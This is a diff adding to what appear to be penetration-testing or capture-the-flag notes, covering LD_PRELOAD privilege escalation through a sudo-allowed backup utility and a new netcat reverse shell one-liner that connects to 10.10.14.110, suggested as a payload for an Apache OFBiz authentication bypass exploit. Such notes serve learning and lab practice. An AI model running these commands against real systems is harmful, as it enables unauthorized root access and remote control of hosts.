@@ -774,3 +774,13 @@ void _init() {
 - Then, compile it using gcc into a shared object file using the following parameters: `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`
 - we need to run the program by specifying the LD_PRELOAD option, as follows: `sudo LD_PRELOAD=/tmp/shell.so sky_backup_utility`
   - Note that the `sky_backup_utility` is the command that the user can run as root
+
+## nc reverse shell
+
+- We can obtain a reverse shell using netcat like:
+
+```shell
+nc -e /bin/bash 10.10.14.110 666
+```
+
+- This is useful when we are sending the payload through a command prompt of an exploit like [Apache OFBiz Authetication Bypass](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/tree/master?tab=readme-ov-file)
